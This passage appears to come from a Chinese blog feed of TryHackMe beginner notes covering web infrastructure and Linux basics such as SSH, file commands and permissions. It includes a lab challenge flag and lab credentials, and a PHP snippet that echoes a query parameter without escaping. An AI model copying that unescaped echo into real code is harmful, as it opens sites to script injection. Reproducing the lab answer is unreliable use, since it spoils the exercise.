<p>当一个网站的流量开始变得相当大，或者正在运行一个需要高可用性的应用程序时，一个web服务器也许不再能够胜任工作——此时我们就需要使用负载均衡器。</p>
<p>负载均衡器能提供两个主要功能：确保高流量网站可以处理负载(load)；在服务器变得无响应时提供故障转移功能。</p>
<p>当你请求一个使用了负载均衡器的网站时，负载均衡器将首先接收到你的请求，然后它会将请求转发到它后面的多个服务器之一；在此过程中，负载均衡器会使用不同的算法来帮助决定哪台服务器最适合处理请求消息，这些算法的两个例子是：轮询(round-robin)和加权(weighted)——前者会依次将请求发送到每个服务器，后者会检查服务器当前正在处理多少请求，再将请求发送到最不繁忙的服务器。</p>
<p>负载均衡器还会对每个服务器执行定期检查，以确保它们能够正常运行，这被称为健康检查（<strong>health check</strong>）；如果服务器没有正确响应或无响应，负载均衡器将停止向服务器发送流量，直到服务器再次正确响应为止。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329194420901.png"
                      alt="image-20230329194420901"
                ></p>
<p><strong>CDN (Content Delivery Networks)</strong></p>
<p>CDN是一个很好的资源，它可以帮助降低“繁忙网站”的流量压力。CND允许网站管理者托管网站的一些静态文件，如JavaScript, CSS，图像，视频等，使用CDN能将网站静态文件托管在世界各地的数千台服务器上。每当用户请求一个被托管的文件时，CDN就会计算出最近的服务器的物理位置，并将用户的请求发送到那里，而不是发送到遥远的世界另一端。</p>
<p><strong>数据库（Databases）</strong></p>
<p>每个网站通常都需要一种为用户存储信息的方法，这就需要使用数据库。</p>
<p>web服务器可以与数据库进行通信，从而能将数据存储到数据库中以及能从数据库中提取数据。数据库可以是简单的纯文本文件，也可以是 由能够提供速度和弹性的多台服务器组成的复杂集群，一些常见的数据库有：MySQL，MSSQL，MongoDB，GraphQL，Postgres等，每一种数据库都有其具体的特性。</p>
<p><strong>WAF (Web Application Firewall)</strong></p>
<p>Web应用程序防火墙(WAF-Web Application Firewall)位于你的web请求和web服务器之间，它的主要目的是保护web服务器免受黑客攻击或拒绝服务(DoS)攻击。</p>
<p>WAF能够分析带有常见攻击技术的恶意web请求，无论这些恶意请求是来自何处；WAF还会利用速率限制来检查是否有过多的网络请求正在被发送，这将只允许一个IP每秒发送一定数量的请求消息。</p>
<p>如果一个请求被认为是潜在的攻击载荷，那么此请求将被WAF拦截以及丢弃，这意味着此请求将永远不会被发送到web服务器。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329194500670.png"
                      alt="image-20230329194500670"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329194637044.png"
                      alt="image-20230329194637044"
                ></p>
<h2 id="Web服务器如何工作"><a href="#Web服务器如何工作" class="headerlink" title="Web服务器如何工作"></a>Web服务器如何工作</h2><p><strong>什么是Web服务器?</strong></p>
<p>web服务器是一种软件，它会监听传入的请求连接，然后利用HTTP协议将web内容传递给客户端浏览器。</p>
<p>常见的web服务器软件有：Apache，Nginx，IIS，NodeJS等。Web服务器将从根目录下(在服务器软件的设置中定义)开始传输文件，例如，Nginx和Apache在Linux操作系统中有相同的默认根目录路径<code>/var/www/html</code>，而IIS在Windows操作系统中的默认根目录路径是<code>C:\inetpub\wwwroot</code>。</p>
<p>如果你向web服务器请求文件- <a class="link"   href="http://www.example.com/picture.jpg" >http://www.example.com/picture.jpg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，web服务器将从它的本地硬盘驱动器中发送文件<code>/var/www/html/picture.jpg</code>。</p>
<p><strong>Virtual Hosts（虚拟主机）</strong></p>
<p>Web服务器可以托管多个具有不同域名的网站，为了实现这一点，Web服务器需要使用虚拟主机。web服务器软件会检查HTTP请求头中的主机名，并将其与虚拟主机进行匹配(虚拟主机只是基于文本的配置文件)。如果HTTP请求中的主机名和虚拟主机成功匹配，web服务器就会向浏览器用户提供一个正确的网站；如果没有找到匹配项，则将提供一个默认网站给浏览器用户。</p>
<p>虚拟主机可以将其根目录映射到web服务器的硬盘驱动器上的不同位置：</p>
<ul>
<li><code>one.com</code>可能被映射到web服务器中的<code>/var/www/website_one</code> ；</li>
<li><code>two.com</code>可能被映射到web服务器中的<code>/var/www/website_two</code> 。</li>
</ul>
<p>你能在一个web服务器上托管不同网站的数量没有限制。</p>
<p><strong>Static Vs Dynamic Content（静态与动态内容）</strong></p>
<p>静态内容，顾名思义，是网站中永不改变的内容，常见的例子是网站的图片、javascript代码、CSS代码等，也可以包括永不更改的HTML内容。此外，静态内容文件是直接由web服务器所提供的文件，web服务器在提供这些静态文件时，无需对这些文件的内容进行任何更改。</p>
<p>另一方面，动态内容是网站中可以随不同的HTTP请求而发生变化的内容。以博客为例，在你的博客主页上会展示文章条目，如果你创建了一个新条目，那么博客主页就会向你显示最新的文章条目，或者以博客上的搜索页面为例，根据你搜索的单词不同，博客网站将会向你显示不同的搜索结果。</p>
<p>你最终看到的网站动态内容都是在所谓的后端中使用编程和脚本语言来完成的，之所以被称为后端，是因为它们所做的一切都是在幕后完成的。你不能查看网站的全部HTML源代码，也不能看到网站的后端具体发生了什么（HTML是后端处理的结果）；你在浏览器中能看到的所有东西都被称为前端。</p>
<p><strong>脚本和后端语言</strong></p>
<p>服务器对后端语言所能实现的功能并没有多少限制，而这些功能的实现正是使网站与用户能够互动的原因。</p>
<p>常见的后端语言包括：PHP，Python，Ruby，NodeJS，Perl等；这些后端语言可以与数据库交互、调用外部服务、处理来自用户的数据……</p>
<p>一个非常基本的PHP示例是：你可以通过访问服务器上的PHP脚本来获得一个网站页面—— <a href="http://example.com/index.php?name=adam">http://example.com/index.php?name=adam</a> 。</p>
<p>如果index.php的内容如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;Hello &lt;?php echo $_GET[&quot;name&quot;]; ?&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>它将向客户端输出以下内容：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>Hello adam<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>你能注意到在客户端看不到任何PHP代码，因为PHP代码位于后端，而后端代码所提供的交互性功能 将为(未安全创建的)web应用程序带来更多的安全问题。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329194949800.png"
                      alt="image-20230329194949800"
                ></p>
<h2 id="示例练习"><a href="#示例练习" class="headerlink" title="示例练习"></a>示例练习</h2><p>进入本文相关的TryHackMe实验房间，展开由实验房间所提供的模拟页面，在模拟页面中将磁贴拖放到正确的网站请求顺序中，最后将得到一个flag。</p>
<p><strong>注意</strong>：当磁贴被放置在正确位置时，它会以绿色标注显示，当磁贴位于错误的位置时，它将以红色标注显示；请<strong>不要</strong>随意刷新模拟页面，因为这将重置模拟环境。</p>
<p>正确的网站请求顺序如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329200155133.png"
                      alt="image-20230329200155133"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329201018085.png"
                      alt="image-20230329201018085"
                ></p>
<p>得到flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329200657201.png"
                      alt="image-20230329200657201"
                ></p>
<blockquote>
<p>得到的flag内容为：THM{YOU_GOT_THE_ORDER} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230329200737830.png"
                      alt="image-20230329200737830"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Linux Fundamentals Part2(Linux基础知识2)-学习</title>
    <url>/2024/01/27/THM-Linux%20Fundamentals%20Part2(Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/linuxfundamentalspart2" >https://tryhackme.com/room/linuxfundamentalspart2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：继续你的 Linux 学习之旅，你将学习如何使用 SSH 登录到 Linux 机器，以及了解更多Linux命令。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>欢迎来到“Linux基础”系列的第二部分，在本文中我们将开始了解能够登录和控制远程Linux机器终端的基本技能，并且，我们还将学习以下内容：</p>
<ul>
<li>介绍参数标志和参数开关以便我们更高效地使用Linux命令；</li>
<li>通过学习更多命令，如复制文件和移动文件等，加强我们对Linux文件系统的了解；</li>
<li>介绍访问权限控制机制，并且了解如何识别当前用户是否具有相关的访问权限，以确保文件和文件夹的安全；</li>
<li>介绍一些Linux中的常见目录。</li>
</ul>
<h2 id="使用-SSH-访问-Linux-机器"><a href="#使用-SSH-访问-Linux-机器" class="headerlink" title="使用 SSH 访问 Linux 机器"></a>使用 SSH 访问 Linux 机器</h2><p>SSH协议是Secure Shell的简称，使用该协议是连接到远程Linux机器的常用方法，通过SSH我们可以使用命令行来与远程Linux机器进行交互。</p>
<p>我们将部署两台机器：</p>
<ul>
<li>TryHackMe所提供的Linux目标虚拟机</li>
<li>TryHackMe所提供的攻击机或者你的本地Kali虚拟机</li>
</ul>
<p><strong>什么是SSH &amp;它是如何工作的?（简单了解）</strong></p>
<p>Secure Shell或SSH 是一种能够对计算机设备之间的通信数据进行加密的协议。使用了SSH协议之后，计算机设备之间需要通过网络传输的数据将被加密处理，一旦加密数据到达远程机器，就会开始解密过程，如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403100313265.png"
                      alt="image-20230403100313265"
                ></p>
<p>在本文中我们只需要对SSH有一个基础了解即可：</p>
<ul>
<li>SSH能够允许我们通过本地设备上针对另一个设备远程执行命令。</li>
<li>使用了SSH协议之后，设备之间所发送的任何数据 在通过网络传输时都会经过加密处理。</li>
</ul>
<p><strong>使用SSH登录Linux机器</strong></p>
<p>SSH的语法非常简单，我们只需要提供以下内容：</p>
<ol>
<li><p>远程计算机的IP地址；</p>
</li>
<li><p>远程计算机上可用于登录的有效帐户及凭据。</p>
</li>
</ol>
<p>在本文中，我们将以”tryhackme”用户帐户登录到远程Linux机器，相关的登录密码是”tryhackme”。</p>
<p>首先，我们需要在TryHackMe攻击机（或者你的本地Kali虚拟机）上打开一个终端；我们要在攻击机终端输入的SSH命令类似于<code>ssh tryhackme@MACHINE_IP</code>，在实际执行SSH命令时，我们需要将示例中的<code>MACHINE_IP</code>替换为Linux目标机的实际IP地址；当输入SSH命令并按下回车键之后，我们会被询问是否信任主机（输入”yes”即可），然后还要为”tryhackme”帐户提供密码（输入”tryhackme”即可）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403102459672.png"
                      alt="image-20230403102459672"
                ></p>
<p>现在我们应该成功通过SSH连接到远程Linux机器，我们接下来所输入的任何命令都将在远程机器上执行——而不会在我们自己的机器上执行。</p>
<p>注意：当你在ssh登录提示中输入密码时，并没有可见的反馈——你将无法在键入密码时看到任何文本或符号出现，我们只需输入密码并按enter即可。</p>
<p><strong>实践操作</strong></p>
<p>输入命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ssh tryhackme@10.10.241.39</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403201425288.png"
                      alt="image-20230403201425288"
                ></p>
<h2 id="Linux命令的参数标志和参数开关"><a href="#Linux命令的参数标志和参数开关" class="headerlink" title="Linux命令的参数标志和参数开关"></a>Linux命令的参数标志和参数开关</h2><p>大多数Linux命令都允许提供参数，这些参数将由连字符以及被称为标志或开关的特定关键字标识。</p>
<p>接下来我们将讨论如何识别哪些命令允许提供参数，以及如何理解这些命令的具体功能。</p>
<p>在使用Linux命令时，除非另有指定，否则它将执行默认行为；例如，<code>ls</code>命令能够列出工作目录下的内容，但是，这并不会显示隐藏文件；所以，我们有时候需要使用参数标志和参数开关来扩展命令的行为。</p>
<p>以<code>ls</code>为例，<code>ls</code>能够告诉我们当前目录下只有一个名为“folder1”的文件夹（请注意，下面截图中的内容仅为示例）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403103507715.png"
                      alt="image-20230403103507715"
                ></p>
<p>然而，在使用<code>-a</code>参数(<code>--all</code>的缩写)对<code>ls</code>命令进行扩展之后，我们会得到一个包含更多文件和文件夹内容的输出结果，例如下图中的”<code>.hiddenfolder</code>“。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403104338287.png"
                      alt="image-20230403104338287"
                ></p>
<p>tips：名称中带”<code>.</code>“表示隐藏文件或者隐藏文件夹，带”<code>.</code>“的文件、文件夹无法通过简单的<code>ls</code>命令被列出。</p>
<p>允许提供参数的命令还可以使用<code>--help</code>选项，该选项会列出此Linux命令能够使用的参数信息（并会提供相关的简要描述和示例）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403104754236.png"
                      alt="image-20230403104754236"
                ></p>
<p>事实上，<code>--help</code>选项也是man page (manual page的缩写)的格式化输出，man page是关于Linux系统命令和应用程序的使用文档。</p>
<p><strong>The Man(ual) Page</strong></p>
<p>man page(手册页)是了解Linux机器上可用的系统命令和应用程序的重要信息来源，我们可以在Linux上访问man page，也可以通过网络<a class="link"   href="https://linux.die.net/man/" >在线访问man page <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>如果要在Linux上访问man page文档，我们可以使用<code>man</code>并将其与具体的Linux命令组合，以<code>ls</code>为例，我们可以使用<code>man ls</code>来查看<code>ls</code>命令的手册页：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403110008841.png"
                      alt="image-20230403110008841"
                ></p>
<p><strong>答题</strong></p>
<p>通过SSH会话对目标Linux虚拟机进行操作：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403201750642.png"
                      alt="image-20230403201750642"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403201800338.png"
                      alt="image-20230403201800338"
                ></p>
<h2 id="可与文件系统交互的更多命令"><a href="#可与文件系统交互的更多命令" class="headerlink" title="可与文件系统交互的更多命令"></a>可与文件系统交互的更多命令</h2><p>在“Linux基础”系列的第一部分，我们介绍了与Linux机器上的文件系统进行交互的一些基本命令。</p>
<p>在本小节中，我们将学习更多可以与文件系统交互的命令，以允许我们：</p>
<ul>
<li>创建文件和文件夹</li>
<li>移动文件和文件夹</li>
<li>删除文件和文件夹</li>
</ul>
<p>更具体地说，我们将学习以下命令：</p>
<ul>
<li>touch（全称为-touch）：创建文件；</li>
<li>mkdir（全称为-make directory）：创建目录，即创建文件夹；</li>
<li>cp（全称为-copy）：复制文件或者文件夹；</li>
<li>mv（全称为-move）：移动文件或者文件夹；</li>
<li>rm（全称为-remove）：移除文件或者文件夹，即删除文件或者文件夹；</li>
<li>file（全称为-file）：确定文件类型。</li>
</ul>
<p>tips：与使用<code>cat</code>命令类似，我们可以为以上这些命令指定一个完整的文件路径，比如，directory1&#x2F;directory2&#x2F;note 。</p>
<p><strong>创建文件和文件夹(touch, mkdir)</strong></p>
<p>在Linux上创建文件和文件夹是一个简单的过程。首先，我们将介绍如何创建一个文件，<code>touch</code>命令只接受一个参数——我们想要给我们创建的文件所赋予的名称；例如，我们可以使用<code>touch note</code>创建“note”文件。值得注意的是，使用<code>touch</code>只会创建一个空白文件，你还需要使用<code>echo</code>之类的命令或<code>nano</code>之类的文本编辑器来向空白文件添加内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403112406458.png"
                      alt="image-20230403112406458"
                ></p>
<p>创建文件夹与创建文件的过程类似，我们只需要使用<code>mkdir</code>命令并提供我们想要赋予给目录的名称即可；例如，我们可以使用<code>mkdir mydirectory</code>创建一个目录“mydirectory”。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403112648611.png"
                      alt="image-20230403112648611"
                ></p>
<p><strong>删除文件和文件夹(rm)</strong></p>
<p>我们可以使用<code>rm</code>命令简单地删除文件，但是，如果我们希望删除一个文件夹（目录）的话，我们就需要使用<code>-R</code>参数开关。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403113006915.png"
                      alt="image-20230403113006915"
                ></p>
<p><strong>复制和移动文件、文件夹(cp, mv)</strong></p>
<p>复制和移动文件是Linux机器上的重要功能，<code>cp</code>命令可以结合以下两个参数使用：</p>
<ol>
<li><p>现有文件的名称；</p>
</li>
<li><p>复制时希望分配给新文件的名称。</p>
</li>
</ol>
<p>使用<code>cp</code>命令能够将现有文件的全部内容复制到新文件中，在下图的示例中，我们将“note”文件复制到“note2”文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403113305603.png"
                      alt="image-20230403113305603"
                ></p>
<p>移动文件所使用的<code>mv</code>命令也需要两个参数，就像<code>cp</code>命令一样；然而，<code>mv</code>命令不会复制并创建一个新文件，而是合并或修改我们作为参数提供的第二个文件。</p>
<p>我们不仅可以使用<code>mv</code>命令将文件移动到新文件夹下，还可以使用<code>mv</code>命令重命名文件或文件夹；例如，在下图的示例中，我们使用<code>mv</code>将文件“note2”重命名为“note3”，现在“note3”文件将拥有“note2”文件的全部内容（“note2”文件会消失）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403113944078.png"
                      alt="image-20230403113944078"
                ></p>
<p><strong>确定文件类型(file)</strong></p>
<p>一个文件通常会有所谓的扩展名，例如，文本文件的扩展名通常是“.txt”，但是文件扩展名并不是文件所必要的（一个文本文件的名称也可以不带.txt）。</p>
<p>我们可以使用<code>file</code>命令来确定一个文件的类型，例如，我们可以使用<code>file</code>来确认“note”文件是否确实是一个文本文件：<code>file note</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403114529729.png"
                      alt="image-20230403114529729"
                ></p>
<p><strong>答题</strong></p>
<p>通过SSH会话对目标Linux虚拟机进行操作：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403205420231.png"
                      alt="image-20230403205420231"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403205330825.png"
                      alt="image-20230403205330825"
                ></p>
<h2 id="访问权限介绍"><a href="#访问权限介绍" class="headerlink" title="访问权限介绍"></a>访问权限介绍</h2><p>在Linux机器上，某些用户可能无权访问一些文件或文件夹，我们之前已经探讨了一些命令，这些命令可用于确定与文件或文件夹相关的访问权限。</p>
<p>在前面的知识点小节中，我们已经学习了如何通过参数标志和参数开关来扩展命令的使用；当我们使用<code>ls</code>命令结合<code>-lh</code>参数开关时，我们可以看到如下示例内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403115704554.png"
                      alt="image-20230403115704554"
                ></p>
<p>如上图所示，我们使用<code>ls -lh</code>命令列出了当前目录下的文件和文件夹的权限分配情况。</p>
<p>tips：<code>-l</code> 使用长列表格式列出内容；<code>-h</code> 全称为–human-readable（顾名思义，以可读形式列出内容） 。</p>
<p>以上输出结果对于确定文件或文件夹的某些特征以及我们是否有权访问它们非常重要，一个文件或文件夹可以有几个特征，这些特征决定了允许执行哪些操作以及哪些用户或组有能力执行给定的操作，例如：</p>
<ul>
<li>Read（读取）：对应的权限标志为“r”；</li>
<li>Write（写入）：对应的权限标志为“w”；</li>
<li>Execute（执行）：对应的权限标志为“x”。</li>
</ul>
<p>假设现在有一个文件名称为“cmnatic. pem”，它的文件权限分配情况如下是”-rw——-“，我们对“cmnatic. pem”文件进行分析：</p>
<ul>
<li>“-”表示“cmnatic. pem”的类型是一个文件；</li>
<li>“rw——-”表示只有“cmnatic.pem”文件的所有者才能读写该文件，并且此文件所有者无权执行该文件。</li>
</ul>
<p>关于权限分配指示符的说明：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">例子：-rwxrwxrwx</span><br><span class="line"></span><br><span class="line">0-9位指示符的说明</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第0位 用于确定文件类型(-,l,d,c,b)</span></span><br><span class="line">- 是文件</span><br><span class="line">l 是链接（link），相当于windows 的快捷方式</span><br><span class="line">d 是目录，相当于windows的文件夹</span><br><span class="line">c 是字符设备文件，鼠标，键盘</span><br><span class="line">b 是块设备，比如硬盘</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第1-3位 用于确定文件所有者（该文件的所有者）拥有该文件的权限情况 —User</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第4-6位 用于确定文件所在组（同用户组的用户）拥有该文件的权限情况 —Group</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第7-9位 用于确定其他用户拥有该文件的权限情况 —Other</span></span><br><span class="line">rwx分别代表的是可读、可写、可执行（如果没有取得对应权限，则会使用&quot;-&quot;符号表示没有该权限）</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rwx作用到文件和rwx作用到目录（权限作用到文件和作用到目录有所不同）</span></span><br><span class="line">r: 如果对一个文件有r权限但对其所在文件夹没有r权限，那么使用ls和ll命令则会提示权限不足，但是可以通过cat来读取该文件内容</span><br><span class="line">w：对一个文件有w权限代表可以对该文件进行修改，但不可以删除该文件，删除一个文件的前提是对该文件所在的目录有w权限</span><br><span class="line">x：x作用到文件表示可以执行，x作用到目录表示可以进入该目录，如果对一个目录没有x权限，使用cd命令想进入该目录时则会提示权限不足</span><br></pre></td></tr></table></figure></div>

<p>修改权限：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">chmod(修改文件权限)</span><br><span class="line"></span><br><span class="line">u=user,g=group,o=other</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">chmod</span> u=rwx,g=r-x,o=--x 文件名</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">chmod</span> g+w 文件名</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">chmod</span> o-x 文件名</span></span><br><span class="line"></span><br><span class="line">r=4,w=2,x=1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">chmod</span> 751 文件名</span></span><br><span class="line"></span><br><span class="line">chown(修改所有者)</span><br><span class="line"></span><br><span class="line">chgrp(修改所在组)</span><br></pre></td></tr></table></figure></div>

<p><strong>简述用户和组之间的区别</strong></p>
<p>我们在Linux基础知识第一部分(即普通用户和系统用户之间的区别)中简要地探讨了这一点。Linux的伟大之处在于，Linux系统中的权限可以划分得很细致，从技术上讲，在一个用户拥有一个文件的同时，如果对权限进行设置，那么另一组用户也可以对同一文件拥有相同或不同的权限集，而不会影响文件所有者本身。</p>
<p>让我们把权限划分的概念放到现实世界中，我们知道运行web服务器的系统用户必须具有有效的针对web应用程序的文件读写权限；然而，类似于提供网络托管服务的公司 将不得不允许他们的客户在不成为web服务器系统用户的情况下 就能为他们的网站上传自己的文件——而这可能会危及所有其他客户的安全。</p>
<p>下面我们将学习在用户之间进行切换所需的命令。</p>
<p><strong>切换用户</strong></p>
<p>由于有<code>su</code>命令，所以在Linux中切换用户变得非常简单。除非你是root用户(或者通过sudo使用root权限)，否则你需要知道以下内容来完成用户帐户的切换：</p>
<ol>
<li>我们希望切换到的有效用户名称；</li>
<li>有效用户的密码。</li>
</ol>
<p>在实际使用<code>su</code>命令时，我们可以将其与参数开关相结合以扩展命令的使用，例如，我们可以指定用户切换后执行命令或指定用户切换后要使用的特定shell。你可以通过阅读<code>su</code>的手册页（<code>man su</code>）以了解更多信息。</p>
<p>简单地说，通过向<code>su</code>命令提供<code>-l</code>（或者<code>--login</code>）参数开关，我们可以启动一个更类似于实际用户登录系统的shell——我们可以继承新用户的更多属性，如环境变量等。</p>
<p>我们可以使用简单的<code>su</code>命令切换到user2用户：<code>su user2</code>，此时我们得到的新会话会将我们放置到前一个用户的主目录中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403181030326.png"
                      alt="image-20230403181030326"
                ></p>
<p>我们也可以使用<code>su</code>命令结合参数开关<code>-l</code>切换到user2用户：<code>su -l user2</code>，此时我们的新会话会自动将我们放到新用户的主目录中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403181356768.png"
                      alt="image-20230403181356768"
                ></p>
<p><strong>答题</strong></p>
<p>通过SSH会话对目标Linux虚拟机进行操作：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403205736563.png"
                      alt="image-20230403205736563"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403205844076.png"
                      alt="image-20230403205844076"
                ></p>
<h2 id="Linux中的常用目录"><a href="#Linux中的常用目录" class="headerlink" title="Linux中的常用目录"></a>Linux中的常用目录</h2><p><strong>&#x2F;etc目录</strong></p>
<p>这个目录是Linux系统上最重要的目录之一，”&#x2F;etc”文件夹(目录)是存储操作系统所使用的系统文件的常见位置。</p>
<p>例如，下图显示的etc&#x2F;sudoers文件包含了 能够以root用户权限运行<code>sudo</code>命令或其他Linux命令的用户和组的列表；下图还显示了etc&#x2F;passwd和etc&#x2F;shadow文件，这两个文件对于Linux也是特殊的，因为它们显示了系统如何以被称为sha512的加密格式存储每个用户的密码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403185401761.png"
                      alt="image-20230403185401761"
                ></p>
<p>tips：etc是etcetera的缩写，etcetera的意思是——“等等；附加物”。</p>
<p><strong>&#x2F;var目录</strong></p>
<p>接下来我们要介绍的是”&#x2F;var”目录，其中”var”是” variable data”（可变数据）的缩写，此目录是Linux系统中的主要目录之一，存储着在系统中运行的服务、应用程序所频繁访问或写入的数据；例如，来自于服务和应用程序运行时的日志文件将被写入到此目录下(<code>/var/log</code>)，其他不一定与特定用户相关联的数据(如数据库等)也会被存储到”&#x2F;var”目录下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403190816800.png"
                      alt="image-20230403190816800"
                ></p>
<p>&#x2F;<strong>root目录</strong></p>
<p>与”&#x2F;home”目录不同，”&#x2F;root”文件夹实际上是”root”系统用户的主目录；除了理解这是”root”用户的主目录之外，这个文件夹没有其他内容。基于逻辑上的假设，用户会将其数据默认保存在”&#x2F;home&#x2F;root”目录中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403191227461.png"
                      alt="image-20230403191227461"
                ></p>
<p><strong>&#x2F;tmp目录</strong></p>
<p>该目录是Linux中的唯一目录，”&#x2F;tmp”目录中的”tmp”是”temporary”（临时）的缩写，它是不稳定的，可用于存储只需要被访问一次或两次的数据；”&#x2F;tmp”在存储数据时与计算机上的内存类似，一旦计算机重新启动，”&#x2F;tmp”文件夹中的内容则将会被自动清除。</p>
<p>我们要知道的是：在默认情况下，任何用户都可以写入内容到这个”&#x2F;tmp”文件夹，这意味着一旦我们访问了一台机器，”&#x2F;tmp”就可以作为存储脚本等内容的极佳选择。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403192005422.png"
                      alt="image-20230403192005422"
                ></p>
<p><strong>答题</strong></p>
<p>通过阅读本小节的内容回答以下问题：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403205931526.png"
                      alt="image-20230403205931526"
                ></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文涵盖了相当多的Linux基础知识，让我们简单回顾一下本文所包含的学习内容：</p>
<ul>
<li>学习使用SSH远程连接到Linux机器；</li>
<li>通过了解参数标志、参数开关以及每个命令的相关信息(手册页)来加强对Linux命令的使用；</li>
<li>学习使用一些常用命令与文件系统及其内容进行交互；</li>
<li>简要介绍了文件权限和怎样切换当前用户；</li>
<li>介绍Ubuntu Linux在默认情况下的常用目录，了解我们应该如何使用存储在这些常用目录中的数据。</li>
</ul>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Linux Fundamentals Part1(Linux基础知识1)-学习</title>
    <url>/2024/01/27/THM-Linux%20Fundamentals%20Part1(Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%861)-%E5%AD%A6%E4%B9%A0/</url>
